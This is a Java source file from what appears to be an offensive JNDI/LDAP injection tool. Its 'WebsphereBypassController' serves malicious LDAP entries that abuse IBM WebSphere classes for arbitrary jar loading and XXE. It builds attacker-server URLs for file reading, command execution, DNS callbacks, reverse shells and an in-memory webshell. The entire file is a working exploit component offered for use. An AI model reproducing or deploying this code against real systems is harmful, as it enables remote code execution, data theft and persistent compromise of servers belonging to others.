package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.enumtypes.WebsphereActionType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedActionTypeException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.utils.*;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.util.Properties;

/*
     * Requires:
     * - websphere v6-9 libraries in the classpath
 */

@LdapMapping(uri = { "/webspherebypass" })
public class WebsphereBypassController implements LdapController {
    private WebsphereActionType actionType;
    private String localJarPath;
    private String injectUrl;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("[+] Sending LDAP ResourceRef result for " + base);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        if(actionType == WebsphereActionType.rce){
            //prepare a payload that leverages arbitrary local classloading in com.ibm.ws.client.applicationclient.ClientJMSFactory
            Reference ref = new Reference("ExportObject",
                    "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory", null);
            Properties refProps = new Properties();
            refProps.put("com.ibm.ws.client.classpath", localJarPath);
            refProps.put("com.ibm.ws.client.classname", "xExportObject");
//            ref.add(new com.ibm.websphere.client.factory.jdbc.PropertiesRefAddrropertiesRefAddr("JMSProperties", refProps));
            e.addAttribute("javaSerializedData", Util.serialize(ref));

        }else{
            //prepare payload that exploits XXE in com.ibm.ws.webservices.engine.client.ServiceFactory
            javax.naming.Reference ref = new Reference("ExploitObject",
                    "com.ibm.ws.webservices.engine.client.ServiceFactory", null);
            ref.add(new StringRefAddr("WSDL location", injectUrl));
            ref.add(new StringRefAddr("service namespace","xxx"));
            ref.add(new StringRefAddr("service local part","yyy"));
            e.addAttribute("javaSerializedData", Util.serialize(ref));
        }

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedActionTypeException {
        try{
            int firstIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();

            try{
                actionType = WebsphereActionType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
                System.out.println("[+] ActionType: " + actionType);
            }catch(IllegalArgumentException e){
                throw new UnSupportedActionTypeException("UnSupportedActionType: " + base.substring(firstIndex + 1, secondIndex));
            }

            switch(actionType){
                case list:
                    String file = base.substring(base.lastIndexOf("=") + 1);
                    System.out.println("[+] Read File/List Directory: " + file);
                    injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/list.wsdl?file=" + file;
                    break;
                case rce:
                    String localJarFile = base.substring(base.lastIndexOf("=") + 1);
                    System.out.println("[+] Local jar path: " + localJarFile);
                    localJarPath = localJarFile;
                    break;
                case upload:
                    int thirdIndex = base.indexOf("/", secondIndex + 1);
                    if(thirdIndex < 0) thirdIndex = base.length();

                    PayloadType payloadType = null;
                    try{
                        payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                        // webspherebypass 只支持这 4 种类型的 PayloadType
                        if(payloadType != PayloadType.command && payloadType != PayloadType.dnslog
                                && payloadType != PayloadType.reverseshell && payloadType != PayloadType.webspherememshell){
                            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + payloadType);
                        }
                    }catch(IllegalArgumentException e){
                        throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                    }

                    System.out.println("[+] PayloadType: " + payloadType);
                    switch (payloadType){
                        case command:
                            String cmd = Util.getCmdFromBase(base);
                            System.out.println("[+] Command: " + cmd);
                            injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=command&cmd=" + cmd;
                            break;
                        case dnslog:
                            String url = base.substring(base.lastIndexOf("/") + 1);
                            System.out.println("[+] URL: " + url);
                            injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=dnslog&url=" + url;
                            break;
                        case reverseshell:
                            String[] results = Util.getIPAndPortFromBase(base);
                            System.out.println("[+] IP: " + results[0]);
                            System.out.println("[+] Port: " + results[1]);
                            injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=reverseshell&ip=" + results[0] + "&port=" + results[1];
                            break;
                        case webspherememshell:
                            injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=webspherememshell";
                            break;
                    }
                    break;
            }
        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;
            if(e instanceof UnSupportedActionTypeException) throw (UnSupportedActionTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}